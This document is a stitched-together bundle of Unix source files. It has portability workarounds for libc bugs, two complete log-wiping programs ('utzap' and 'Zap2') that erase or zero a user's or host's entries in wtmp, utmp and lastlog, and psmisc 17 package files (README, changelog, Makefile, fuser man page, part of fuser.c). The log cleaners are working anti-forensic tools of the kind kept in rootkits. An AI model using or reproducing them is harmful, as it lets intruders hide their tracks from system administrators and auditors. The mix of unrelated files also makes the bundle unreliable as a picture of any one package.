#define MAXHOSTNAMELEN  256             /* storage for host name */
#endif

 /*
  * Some DG/UX inet_addr() versions return a struct/union instead of a long.
  * You have this problem when the compiler complains about illegal lvalues
  * or something like that. The following code fixes this mutant behaviour.
  * It should not be enabled on "normal" systems.
  * 
  * Bug reported by ben@piglet.cr.usgs.gov (Rev. Ben A. Mesander).
  */

#ifdef INET_ADDR_BUG

#undef inet_addr

long    fix_inet_addr(string)
char   *string;
{
    return (inet_addr(string).s_addr);
}

#endif /* INET_ADDR_BUG */

 /*
  * With some System-V versions, the fgets() library function does not
  * account for partial reads from e.g. sockets. The result is that fgets()
  * gives up too soon, causing username lookups to fail. Problem first
  * reported for IRIX 4.0.5, by Steve Kotsopoulos <steve@ecf.toronto.edu>.
  * The following code works around the problem. It does no harm on "normal"
  * systems.
  */

#ifdef BROKEN_FGETS

#undef fgets

char   *fix_fgets(buf, len, fp)
char   *buf;
int     len;
FILE   *fp;
{
    char   *cp = buf;
    int     c;

    /*
     * Copy until the buffer fills up, until EOF, or until a newline is
     * found.
     */
    while (len > 1 && (c = getc(fp)) != EOF) {
	len--;
	*cp++ = c;
	if (c == '\n')
	    break;
    }

    /*
     * Return 0 if nothing was read. This is correct even when a silly buffer
     * length was specified.
     */
    if (cp > buf) {
	*cp = 0;
	return (buf);
    } else {
	return (0);
    }
}

#endif /* BROKEN_FGETS */

 /*
  * With early SunOS 5 versions, recvfrom() does not completely fill in the
  * source address structure when doing a non-destructive read. The following
  * code works around the problem. It does no harm on "normal" systems.
  */

#ifdef RECVFROM_BUG

#undef recvfrom

int     fix_recvfrom(sock, buf, buflen, flags, from, fromlen)
int     sock;
char   *buf;
int     buflen;
int     flags;
struct sockaddr *from;
int    *fromlen;
{
    int     ret;

    /* Assume that both ends of a socket belong to the same address family. */

    if ((ret = recvfrom(sock, buf, buflen, flags, from, fromlen)) >= 0) {
	if (from->sa_family == 0) {
	    struct sockaddr my_addr;
	    int     my_addr_len = sizeof(my_addr);

	    if (getsockname(0, &my_addr, &my_addr_len)) {
		tcpd_warn("getsockname: %m");
	    } else {
		from->sa_family = my_addr.sa_family;
	    }
	}
    }
    return (ret);
}

#endif /* RECVFROM_BUG */

 /*
  * The Apollo SR10.3 and some SYSV4 getpeername(2) versions do not return an
  * error in case of a datagram-oriented socket. Instead, they claim that all
  * UDP requests come from address 0.0.0.0. The following code works around
  * the problem. It does no harm on "normal" systems.
  */

#ifdef GETPEERNAME_BUG

#undef getpeername

int     fix_getpeername(sock, sa, len)
int     sock;
struct sockaddr *sa;
int    *len;
{
    int     ret;
    struct sockaddr_in *sin = (struct sockaddr_in *) sa;

    if ((ret = getpeername(sock, sa, len)) >= 0
	&& sa->sa_family == AF_INET
	&& sin->sin_addr.s_addr == 0) {
	errno = ENOTCONN;
	return (-1);
    } else {
	return (ret);
    }
}

#endif /* GETPEERNAME_BUG */

 /*
  * According to Karl Vogel (vogelke@c-17igp.wpafb.af.mil) some Pyramid
  * versions have no yp_default_domain() function. We use getdomainname()
  * instead.
  */

#ifdef USE_GETDOMAIN

int     yp_get_default_domain(ptr)
char  **ptr;
{
    static char mydomain[MAXHOSTNAMELEN];

    *ptr = mydomain;
    return (getdomainname(mydomain, MAXHOSTNAMELEN));
}

#endif /* USE_GETDOMAIN */

#ifndef INADDR_NONE
#define INADDR_NONE 0xffffffff
#endif

 /*
  * Solaris 2.4 gethostbyname() has problems with multihomed hosts. When
  * doing DNS through NIS, only one host address ends up in the address list.
  * All other addresses end up in the hostname alias list, interspersed with
  * copies of the official host name. This would wreak havoc with tcpd's
  * hostname double checks. Below is a workaround that should do no harm when
  * accidentally left in. A side effect of the workaround is that address
  * list members are no longer properly aligned for structure access.
  */

#ifdef SOLARIS_24_GETHOSTBYNAME_BUG

#undef gethostbyname

struct hostent *fix_gethostbyname(name)
char   *name;
{
    struct hostent *hp;
    struct in_addr addr;
    char  **o_addr_list;
    char  **o_aliases;
    char  **n_addr_list;
    int     broken_gethostbyname = 0;

    if ((hp = gethostbyname(name)) && !hp->h_addr_list[1] && hp->h_aliases[1]) {
	for (o_aliases = n_addr_list = hp->h_aliases; *o_aliases; o_aliases++) {
	    if ((addr.s_addr = inet_addr(*o_aliases)) != INADDR_NONE) {
		memcpy(*n_addr_list++, (char *) &addr, hp->h_length);
		broken_gethostbyname = 1;
	    }
	}
	if (broken_gethostbyname) {
	    o_addr_list = hp->h_addr_list;
	    memcpy(*n_addr_list++, *o_addr_list, hp->h_length);
	    *n_addr_list = 0;
	    hp->h_addr_list = hp->h_aliases;
	    hp->h_aliases = o_addr_list + 1;
	}
    }
    return (hp);
}

#endif /* SOLARIS_24_GETHOSTBYNAME_BUG */

 /*
  * Horror! Some FreeBSD 2.0 libc routines call strtok(). Since tcpd depends
  * heavily on strtok(), strange things may happen. Workaround: use our
  * private strtok(). This has been fixed in the meantime.
  */

#ifdef USE_STRSEP

char   *fix_strtok(buf, sep)
char   *buf;
char   *sep;
{
    static char *state;
    char   *result;

    if (buf)
	state = buf;
    while ((result = strsep(&state, sep)) && result[0] == 0)
	 /* void */ ;
    return (result);
}

#endif /* USE_STRSEP */

 /*
  * IRIX 5.3 (and possibly earlier versions, too) library routines call the
  * non-reentrant strtok() library routine, causing hosts to slip through
  * allow/deny filters. Workaround: don't rely on the vendor and use our own
  * strtok() function. FreeBSD 2.0 has a similar problem (fixed in 2.0.5).
  */

#ifdef LIBC_CALLS_STRTOK

char   *my_strtok(buf, sep)
char   *buf;
char   *sep;
{
    static char *state;
    char   *result;

    if (buf)
	state = buf;

    /*
     * Skip over separator characters and detect end of string.
     */
    if (*(state += strspn(state, sep)) == 0)
	return (0);

    /*
     * Skip over non-separator characters and terminate result.
     */
    result = state;
    if (*(state += strcspn(state, sep)) != 0)
	*state++ = 0;
    return (result);
}

#endif /* LIBC_CALLS_STRTOK */
#include <stdio.h>
#include <utmp.h>
#include <time.h>
#include <fcntl.h>

char *file="/var/adm/wtmp";

main(argc,argv)
int argc;
char *argv[];
{
int i;
if (argc==1) usage();
for(i=1;i<argc;i++)
	{
	if(argv[i][0] == '-')
		{
		switch(argv[i][1])
			{
			case 'b': printents(""); break;
			case 'z': printents("Z4p"); break;
			case 'e': erase(argv[i+1],0); break;
			case 'c': erase(0,argv[i+1]); break;
			case 'f': file=argv[i+1]; break;
			case 'u': printents(argv[i+1]); break;
			case 'a': printents("*"); break;
			case 'x': remnull(argv[i+1]); break;
			default:usage();
			}
		}
	}
}

printents(name)
char *name;
{
struct utmp utmp,*ptr;
int fp=-1;
ptr=&utmp;
if (fp=open(file,O_RDONLY))
	{
	while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp))
		{
		if ( !(strcmp(name,ptr->ut_name)) || (name=="*") ||
		(!(strcmp("Z4p",name)) && (ptr->ut_time==0)))
			printinfo(ptr);
		}
	close(fp);
	}
}

printinfo(ptr)
struct utmp *ptr;
{
char tmpstr[256];
printf("%s\t",ptr->ut_name);
printf("%s\t",ptr->ut_line);
strcpy(tmpstr,ctime(&(ptr->ut_time)));
tmpstr[strlen(tmpstr)-1]='\0';
printf("%s\t",tmpstr);
printf("%s\n",ptr->ut_host);
}

erase(name,host)
char *name,*host;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct utmp utmp;
unsigned char c;
if (fp=open(file,O_RDONLY)) {
        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
		if (host)
			if (strstr(utmp.ut_host,host)) tot++;
			else {cnt++;write(fd,&utmp,sizeof(struct utmp));}
		if (name) {
                if (strcmp(utmp.ut_name,name)) {cnt++;
			write(fd,&utmp,sizeof(struct utmp));}
		else { 
			if (n>0) {
				n--;cnt++;
				write(fd,&utmp,sizeof(struct utmp));}
			else
			{
			printinfo(&utmp);
			printf("Erase entry (y/n/f(astforward))? ");
			c='a';
			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
			if (c=='f') {
				cnt++;
				write(fd,&utmp,sizeof(struct utmp));
				printf("Fast forward how many entries? ");
				scanf("%d",&n);}
			if (c=='n') {
				cnt++;
				write(fd,&utmp,sizeof(struct utmp));
				}
			if (c=='y') tot++;
			} 
		      }	}					
        }
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
}

remnull(name)
char *name;
{
int fp=-1,fd=-1,tot=0,cnt=0,n=0;
struct utmp utmp;
if (fp=open(file,O_RDONLY)) {
        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
		if (utmp.ut_time) {
			cnt++;
			write(fd,&utmp,sizeof(struct utmp));
		}
		else
			tot++;
	}
        close(fp);
        close(fd);
        }
printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
}

usage()
{
printf("Usage: utzap -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
printf("\t-h\tThis help\n");
printf("\t-f\tUse FILE instead of default\n");
printf("\t-a\tShow all entries found\n");
printf("\t-u\tShow all entries for USER\n");
printf("\t-b\tShow NULL entries\n"); 
printf("\t-e\tErase USER completely\n");
printf("\t-c\tErase all connections containing HOST\n");
printf("\t-z\tShow ZAP'd entries\n");
printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
}
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
 
int f;
 
void kill_utmp(who)
char *who;
{
    struct utmp utmp_ent;
 
  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
                 write (f, &utmp_ent, sizeof (utmp_ent));
            }
     close(f);
  }
}
 
void kill_wtmp(who)
char *who;
{
    struct utmp utmp_ent;
    long pos;
 
    pos = 1L;
    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
 
     while(pos != -1L) {
        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
          pos = -1L;
        } else {
          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
               bzero((char *)&utmp_ent,sizeof(struct utmp ));
               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
               write (f, &utmp_ent, sizeof (utmp_ent));
               pos = -1L;
          } else pos += 1L;
        }
     }
     close(f);
  }
}
 
void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
 
     if ((pwd=getpwnam(who))!=NULL) {
 
        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            bzero((char *)&newll,sizeof( newll ));
            write(f, (char *)&newll, sizeof( newll ));
            close(f);
        }
 
    } else printf("%s: ?\n",who);
}
 
main(argc,argv)
int argc;
char *argv[];
{
    if (argc==2) {
        kill_lastlog(argv[1]);
        kill_wtmp(argv[1]);
        kill_utmp(argv[1]);
        printf("Zap2!\n");
    } else
    printf("Error.\n");
}

17
psmisc, version 17
==================

This package contains four little utilities that use the proc FS:

  fuser     identifies processes using files or sockets (similar to Sun's
	    or SGI's fuser)
  killall   kills processes by name, e.g. killall -HUP named
  pidof	    like killall, buts lists PIDs instead of killing processes
  pstree    shows the currently running processes as a tree

They should work with most recent kernels. Man pages are included.

- Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
To build all programs in psmisc, simply execute

    make

To install fuser, killall, pstree, and their man pages, run (as root)

    make install

fuser is installed in /bin, killall and pstree are installed in /usr/bin

pidof is not installed by  make install  because different versions of
pidof exist and may already be installed. If you want to install the
pidof that comes with psmisc (and its man page), simply run (as root)

    make install-pidof
Changes from version 16 to 17 (17-FEB-1998)
=============================

 - fuser: now also handles /proc of recent 2.1 kernels (fix by Andreas Schwab;
   other fixed also proposed by Chris Wedgwood and Luca Berra)
 - pstree now properly handles init with PID = PPID = 1
 - fuser: no longer changes the name space for relative paths ending with the
   name of a name space (e.g. something/tcp)
 - fuser: now also reports mount points, swap files, and loop mounts
 - updated the fuser man page
 - killall: new option -w to wait for the killed processes to die
 - killall: didn't handle malloc failure


Changes from version 15 to 16 (28-JUL-1997)
=============================

 - killall: now gets the list of all PIDs before killing processes, thereby
   avoiding race between readdir and /proc (found by Boris Zentner)
 - make install no longer changes BINDIR and MANDIR if they already exist
 - changed psmisc.<version>.lsm to psmisc-<version>.lsm for consistency


Changes from version 14 to 15 (16-JUN-1997)
=============================

 - killall: killall -v didn't print the command name (fixed by Marty Leisner)
 - fuser: fuser -a <unix_domain_socket>  could crash (reported by Helmut Geyer)
 - fuser: fuser -m didn't consider UNIX domain sockets (fix based on a patch by
   Andries Brouwer)
 - fuser: fuser -a /a /a /b  no longer merges the first two entries
 - changed package name format from psmisc.<version> to psmisc-<version> to
   avoid annoyance messages from sunsite's archive scripts


Changes from version 13 to 14 (19-APR-1997)
=============================

 - killall: command-line parser didn't accept -signal (fixed by Chris Wedgwood)
 - pidof: minor man page correction
 - Makefile: pidof is now only installed when running make install-pidof
 - added a file with installation instructions (INSTALL)


Changes from version 12 to 13 (16-APR-1997)
=============================

 - fuser: didn't check for out of memory condition after malloc (oops !)
 - fuser: INET domain sockets can now be specified as
   [local_port][,[remote_host][,[remote_port]]]
 - fuser: now includes linux/kdev_t.h instead of linux/fs.h. This may break
   compilation with some ancient kernels.
 - killall: new option -q to suppress error message if no process was found
 - killall: man page didn't reset font properly
 - killall: now tries harder to handle very long names (> 15 characters)
   (proposed by Erik Thiele)
 - killall: new option -e to require exact name match
 - killall: now lists PIDs if invoked as "pidof" (proposed by Peter Daum)
 - minor Makefile change to eliminate need to patch for some versions of Linux


Changes from version 11 to 12 (7-APR-1996)
=============================

 - fuser is now able to look up INET and UNIX domain sockets
 - pstree: new option -n to sort its output by PID
 - pstree: new option -G to use VT100 line drawing characters


Changes from version 10 to 11 (20-SEP-1995)
=============================

 - added VERSION file
 - size of command name is now defined in comm.h - the old approach of
   obtaining values from linux/sched.h:struct task_struct doesn't work anymore)
 - signames.h is now generated from cpp output (linux/signals.h no longer
   defines them)
 - all commands now print the version number when invoked with the -V option
 - signames.h added to  make clean
 - removed use of {,} expansion in mkdist
 - various minor documentation fixes


Changes from version 9 to 10 (28-MAR-1995)
============================

 - fuser: now prints header before first path (used to be on same line)
 - fuser: fixed line wrapping for long paths (used to wrap too early)
 - fuser: fixed a NULL pointer dereference in add_file
 - pstree: now outputs strings obtained from termcap with tputs
 - some cosmetic changes (to avoid certain warnings if using -Wconversion)
 - updated e-mail address in README

Changes from version 8 to 9 (22-JAN-1995)
===========================

 - fuser: now works with Plan 9 semantics (i.e. what recent kernels use;
   reported by Harald Koenig, Nick Simicich, and others)
 - fuser: now also scans /proc/*/maps
 - fuser: fixed NULL pointer dereferencing when processes are created while
   fuser is running (fix by Pauline Middelink)
 - fuser: now resets effective uid to real uid before killing, thereby making
   suid installation a smaller security risk
 - pstree: fixed process tree truncation (fix by Andreas Schwab)
 - pstree: added support for UTF-8 line drawing characters (adapted a patch by
   Johan Myreen)
 - killall.1 now warns about potential compatibility problems with killall
   on other systems (proposed by Christos Ricudis)
 - added a copyright notice
 - updated e-mail address

Changes from version 7 to 8 (11-OCT-1994)
===========================

 - pstree: added -a to display command line arguments
 - pstree, fuser and killall: display an error message if /proc has
   no process entries (i.e. if it is not mounted)
 - killall: more detailed usage output
 - killall: added killing by file
 - fuser and killall: fixed generation of signal list to include SIGUSR[12]
 - fuser: now also accepts signal numbers
 - "make install": now also installs man pages; executable permissions changed
   from 755 to 555; now installs fuser in /bin, killall and pstree in /usr/bin
 - "make spotless": fixed typo
 - man pages: minor corrections and improvements

Changes from version 6 to 7
===========================

 - pstree: -h didn't work because of incorrect termcap usage
 - pstree: changed branch drawing from --- to -+-
					\-     `-
 - pstree: fixed indentation inside compacted subtrees
 - fuser and killall: don't kill themselves
 - fuser: suppresses m(map) if file is e(xecuted)
 - mkdist now includes itself
 - minor updates on all man pages

Changes from version 5 to 6
===========================

 - pstree: unknown display width expressed as zero width (TIOCGWINSZ) is
	   now correctly handled.
 - fuser: added -s for silent operation.
 - fuser: added non-zero return code if no processes using any file are
	  found.
 - pstree and fuser: non-printable characters in command names (fuser: also
     in file names) are now shown as \nnn (octal). \ is shown as \\.
 - added "install" target to Makefile to install binaries in /usr/local/bin
 - minor updates on all man pages.

Changes from version 4 to 5
===========================

 - killall: added interactive and verbose modes (options -i and -v)
 - fuser: added 0.99pl11 support (changed /proc/*/lib to /proc/*/mmap)
 - fuser: mmap'ed files and shared libraries are now marked with "m"
          (shlibs were marked with "s" and mmap'ed files weren't marked
          at all)

Changes from version 3 to 4
===========================

 - killall and fuser: now accept signal numbers too.
 - pstree: added listing of process trees by user name.
 - pstree: compaction sometimes generated wrong output.
 - fuser: did only recognize the first occurrence of a file when using
   the options -u or -v.
 - changed Makefile to create stripped impure executables.
psmisc (fuser, killall and pstree) program code, documentation and
auxiliary programs are
Copyright 1993-1998 Werner Almesberger.
All rights reserved.

Redistribution and use in source and binary forms of parts of or the
whole original or derived work are permitted provided that the
original work is properly attributed to the author. The name of the
author may not be used to endorse or promote products derived from
this software without specific prior written permission. This work
is provided "as is" and without any express or implied warranties.
Begin3
Title:		psmisc
Version:	17
Entered-date:	February 17, 1998
Description:	miscellaneous proc FS tools: fuser, killall, pidof, and pstree
Keywords:	psmisc, fuser, killall, pidof, pstree
Author:		Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
Maintained-by:	Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
Primary-site:	lrcftp.epfl.ch /pub/linux/local/psmisc
		20 kB psmisc-17.tar.gz
Alternate-site:	sunsite.unc.edu /pub/Linux/system/status/ps
Platforms:	Should work with most kernels. Requires /proc
Copying-Policy:	BSD-like
End
CC=cc
CFLAGS=-O -DPSMISC_VERSION=\"`cat VERSION`\" \
  -Wall -Wno-parentheses -Wwrite-strings -Wpointer-arith \
  # -Wcast-align -Wconversion -g
LDFLAGS=#-s -N #-Xlinker -qmagic
REAL_CPP=/lib/cpp
PROGS=killall pstree fuser
EBINDIR=/bin		# essential binaries
BINDIR=/usr/bin		# not so essential ones
MANDIR=/usr/man/man1	# all man pages

all:		$(PROGS)

signames.h:	/usr/include/signal.h
		$(REAL_CPP) -dM </usr/include/signal.h | \
		tr -s '\t ' '  ' | sort -n +2 | sed \
	's:#define SIG\([A-Z]\+[0-9]*\) \([0-9]\+\) *\(\|/\*.*\)$$:{\
\2,"\1" },:p;d' \
		  > signames.h

signals.o:	signals.h signals.c signames.h Makefile

fuser.o:	fuser.c comm.h signals.h Makefile VERSION
killall.o:	killall.c comm.h signals.h Makefile VERSION

fuser:		fuser.o signals.o
killall:	killall.o signals.o

pstree:		pstree.c comm.h Makefile VERSION
		$(CC) $(CFLAGS) $(LDFLAGS) -o pstree pstree.c -ltermcap

install:	$(PROGS)
#		EBINDIR is expected to exist, so we don't try to create it
		install -o 0 -g 0 -m 555 fuser $(EBINDIR)
		[ -d $(BINDIR) ] || install -d -o 0 -g 0 -m 755 $(BINDIR)
		install -o 0 -g 0 -m 555 killall $(BINDIR)
		install -o 0 -g 0 -m 555 pstree $(BINDIR)
		[ -d $(MANDIR) ] || install -d -o 0 -g 0 -m 755 $(MANDIR)
		install -o 0 -g 0 -m 444 fuser.1 $(MANDIR)
		install -o 0 -g 0 -m 444 killall.1 $(MANDIR)
		install -o 0 -g 0 -m 444 pstree.1 $(MANDIR)

install-pidof:
		@[ -x `echo $(BINDIR)`/killall ] || { \
		  echo "Need `echo $(BINDIR)`/killall to install pidof"; \
		  exit 1 }
		ln -sf killall `echo $(BINDIR)`/pidof
		install -o 0 -g 0 -m 444 pidof.1 $(MANDIR)

clean:
		rm -f *.o signames.h

spotless:	clean
		rm -f $(PROGS)
/* comm.h - command name length definition */
 
/* Copyright 1995 Werner Almesberger. See file COPYING for details. */
 

#ifndef COMM_H
#define COMM_H

#if 0 /* broken in 1.3.xx */
#include <linux/sched.h>
#define COMM_LEN sizeof(dummy.comm)
extern struct task_struct dummy;
#else
#define COMM_LEN 16 /* synchronize with size of comm in struct task_struct in
		       /usr/include/linux/sched.h */
#endif

#endif
/* signals.h - signal name handling */

/* Copyright 1993-1995 Werner Almesberger. See file COPYING for details. */


#ifndef SIGNALS_H
#define SIGNALS_H

void list_signals(void);

/* Lists all known signal names on standard output. */

int get_signal(char *name,const char *cmd);

/* Returns the signal number of NAME. If no such signal exists, an error
   message is displayed and the program is terminated. CMD is the name of the
   application. */

#endif
.TH FUSER 1 "Feb 3, 1998" "Linux" "User Commands"
.SH NAME
fuser \- identify processes using files or sockets
.SH SYNOPSIS
.ad l
.B fuser
.RB [ \-a | \-s ]
.RB [ \-n\ \fIspace ]
.RB [ \-\fIsignal\fB ]
.RB [ \-kmuv ]
.I name ...
.RB [ \- ]
.RB [ \-n\ \fIspace ]
.RB [ \-\fIsignal\fB ]
.RB [ \-kmuv ]
.I name ...
.br
.B fuser 
.RB \-l
.br
.B fuser 
.RB \-V
.ad b
.SH DESCRIPTION
.B fuser
displays the PIDs of processes using the specified files or file systems.
In the default display mode, each file name is followed by a letter denoting
the type of access:
.RS
.IP \fBc\fP
current directory.
.IP \fBe\fP
executable being run.
.IP \fBf\fP
open file. \fBf\fP is omitted in default display mode.
.IP \fBr\fP
root directory.
.IP \fBm\fP
mmap'ed file or shared library.
.RE
.LP
\fBfuser\fP returns a non-zero return code if none of the specified files
is accessed or in case of a fatal error. If at least one access has been
found, \fBfuser\fP returns zero.
.PP
In order to look up processes using TCP and UDP sockets, the corresponding
name space has to be selected with the \fB-n\fP option. Then the socket(s) can
be specified by the local and remote port, and the remote address. All fields
are optional, but commas in front of missing fields must be present:

.RB \fB[\fP\fIlcl_port\fP\fB][\fP,\fB[\fP\fIrmt_host\fP\fB][\fP,\fB[\fIrmt_port\fP\fB]]]

Either symbolic or numeric values can be used for IP addresses and port
numbers.
.SH OPTIONS
.IP \fB\-a\fP
Show all files specified on the command line. By default, only files that are
accessed by at least one process are shown.
.IP \fB\-k\fP
Kill processes accessing the file. Unless changed with \fB-\fP\fIsignal\fP,
SIGKILL is sent. An \fBfuser\fP process never kills itself, but may kill
other \fBfuser\fP processes. The effective user ID of the process executing
\fBfuser\fP is set to its real user ID before attempting to kill.
.IP \fB\-l\fP
List all known signal names.
.IP \fB\-m\fP
\fIname\fP specifies a file on a mounted file system or a block device that
is mounted. All processes accessing files on that file system are listed.
If a directory file is specified, it is automatically changed to
\fIname\fP/. to use any file system that might be mounted on that
directory.
.IP \fB\-n\ \fIspace\fP
Select a different name space. The name spaces \fBfile\fP (file names, the
default), \fBudp\fP (local UDP ports), and \fBtcp\fP (local TCP ports) are
supported.  For ports, either the port number or the symbolic name can be
specified. If there is no ambiguity, the shortcut notation
\fIname\fB/\fIspace\fP (e.g. \fIname\fB/\fIproto\fP) can be used.
.IP \fB\-s\fP
Silent operation. \fB\-a\fP, \fB\-u\fP and \fB\-v\fP are ignored in this mode.
.IP \fB\-\fIsignal\fP
Use the specified signal instead of SIGKILL when killing processes. Signals
can be specified either by name (e.g. \fB\-HUP\fP) or by number
(e.g. \fB\-1\fP).
.IP \fB\-u\fP
Append the user name of the process owner to each PID.
.IP \fB\-v\fP
Verbose mode. Processes are shown in a \fBps\fP-like style. The fields PID,
USER and COMMAND are similar to \fBps\fP. ACCESS shows how the process
accesses the file. If the access is by the kernel (e.g. in the case of a
mount point, a swap file, etc.), \fBkernel\fP is shown instead of the PID.
.IP \fB\-V\fP
Display version information.
.IP \fB\-\fP
Reset all options and set the signal back to SIGKILL.
.SH FILES
.nf
/proc	location of the proc file system
.fi
.SH EXAMPLES
\fBfuser -km /home\fP kills all processes accessing the file system /home
in any way.
.LP
\fBif fuser -s /dev/ttyS1; then :; else \fIsomething\fP; fi\fR invokes
\fIsomething\fP if no other process is using /dev/ttyS1.
.LP
\fBfuser telnet/tcp\fP shows all processes at the (local) TELNET port.
.SH RESTRICTIONS
Processes accessing the same file or file system several times in the same way
are only shown once.
.PP
If the same object is specified several times on the command line, some of
those entries may be ignored.
.PP
\fBfuser\fP may only be able to gather partial information unless run with
privileges. As a consequence, files opened by processes belonging to other
users may not be listed and executables may be classified as mapped only.
.PP
Installing \fBfuser\fP SUID root will avoid problems associated with
partial information, but may be undesirable for security and privacy
reasons.
.PP
\fBudp\fP and \fBtcp\fP name spaces, and UNIX domain sockets can't be
searched with kernels older than 1.3.78.
.PP
\fBudp\fP and \fBtcp\fP currently only work for IPv4.
.PP
Accesses by the kernel are only shown with the \fB-v\fP option.
.PP
The \fB-k\fP option only works on processes. If the user is the kernel,
\fBfuser\fP will print an advice, but take no action beyond that.
.SH AUTHOR
Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
.SH "SEE ALSO"
kill(1), killall(1), ps(1), kill(2)
.\"{{{}}}
/* fuser.c - identify processes using files */

/* Copyright 1993-1998 Werner Almesberger. See file COPYING for details. */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <dirent.h>
#include <pwd.h>
#include <signal.h>
#include <limits.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/kdev_t.h> /* for MKDEV */
#include <linux/major.h> /* for LOOP_MAJOR */

#include "comm.h"
#include "signals.h"


#define PROC_BASE  "/proc"
#define UID_UNKNOWN -1
#define NAME_FIELD 20 /* space reserved for file name */

#define MAX_LINE 256 /* longest line we may ever find in /proc */


#ifndef LOOP_MAJOR /* don't count on the headers too much ... */
#define LOOP_MAJOR 7
#endif


#define REF_FILE   1	/* an open file */
#define REF_ROOT   2	/* current root */
#define REF_CWD    4	/* current directory */
#define REF_EXE    8	/* executable */
#define REF_MMAP  16	/* mmap'ed file or library */

#define FLAG_KILL  1	/* kill process */
#define FLAG_UID   2	/* show uid */
#define FLAG_VERB  4	/* show verbose output */
#define FLAG_DEV   8	/* show all processes using this device */


typedef struct _net_cache {
    int lcl_port;
    int rmt_port;
    unsigned long rmt_addr;
    ino_t ino;
    struct _net_cache *next;
} NET_CACHE;

typedef struct _unix_cache {
    dev_t fs_dev;
    ino_t fs_ino;
    ino_t net_ino;
    struct _unix_cache *next;
} UNIX_CACHE;

typedef struct {
    const char *name;
    NET_CACHE *cache;
    int once;
} SPACE_DSC;

typedef enum { it_proc,it_mount,it_loop,it_swap } ITEM_TYPE;

typedef struct item_dsc {
    ITEM_TYPE type;
    union {
	struct {
	    pid_t pid;
	    int uid; /* must also accept UID_UNKNOWN */
	    int ref_set;
	} proc;
	struct {
	    const char *path;
	} misc;
    } u;
    struct item_dsc *next;
} ITEM_DSC;

typedef struct file_dsc {
    const char *name;  /* NULL if previous entry has name */
    dev_t dev;
    ino_t ino;
    int flags,sig_num;
    SPACE_DSC *name_space; /* or NULL if no indication */
    ITEM_DSC *items;
    struct file_dsc *named,*next;
} FILE_DSC;

static SPACE_DSC name_spaces[] = {
    { "file", NULL, 0 }, /* must be first */
    { "tcp",  NULL, 0 },
    { "udp",  NULL, 0 },
    { NULL,   NULL, 0 }
};


static FILE_DSC *files = NULL;
static FILE_DSC *last_named = NULL;
static UNIX_CACHE *unix_cache = NULL;
static int all = 0,found_item = 0;


static void fill_net_cache(SPACE_DSC *dsc)
{
    FILE *file;
    NET_CACHE *new,*last;
    char buffer[PATH_MAX+1],line[MAX_LINE+1];

    if (dsc->once) return;
    dsc->once = 1;
    sprintf(buffer,PROC_BASE "/net/%s",dsc->name);
    if (!(file = fopen(buffer,"r"))) {
	perror(buffer);
	exit(1);
    }
    last = NULL;
    (void) fgets(line,MAX_LINE,file);
    while (fgets(line,MAX_LINE,file)) {
	new = malloc(sizeof(NET_CACHE));
	if (!new) {
	    perror("malloc");
	    exit(1);
	}
	if (sscanf(line,"%*d: %*x:%x %lx:%x %*x %*x:%*x %*x:%*x %*x %*d %*d "
	  "%ld",&new->lcl_port,&new->rmt_addr,&new->rmt_port,&new->ino) != 4) {
	    free(new);
	    continue;
	}
	if (!new->ino) {
	    free(new);
	    continue;
	}
	new->next = NULL;
	if (last) last->next = new;
	else dsc->cache = new;
	last = new;
    }
    (void) fclose(file);
}


static void fill_unix_cache(void)
{
    static int once;
    FILE *file;
    UNIX_CACHE *new,*last;
    struct stat st;
    char path[PATH_MAX+1],line[MAX_LINE+1];
    int ino;

    if (once) return;
    once = 1;
    if (!(file = fopen(PROC_BASE "/net/unix","r"))) {
	perror(PROC_BASE "/net/unix");
	exit(1);
    }
    last = NULL;
    (void) fgets(line,MAX_LINE,file);
    while (fgets(line,MAX_LINE,file)) {
	if (sscanf(line,"%*x: %*x %*x %*x %*x %*x %d %s",&ino,path) != 2)
	    continue;
	if (stat(path,&st) < 0) continue;
	new = malloc(sizeof(UNIX_CACHE));
	new->fs_dev = st.st_dev;
	new->fs_ino = st.st_ino;
	new->net_ino = ino;
	new->next = NULL;
	if (last) last->next = new;
	else unix_cache = new;
	last = new;
    }
    (void) fclose(file);
    
}


static unsigned long try_to_find_unix_dev(unsigned long inode)
{
    UNIX_CACHE *walk;

    for (walk = unix_cache; walk; walk = walk->next)
	if (walk->net_ino == inode) return walk->fs_dev;
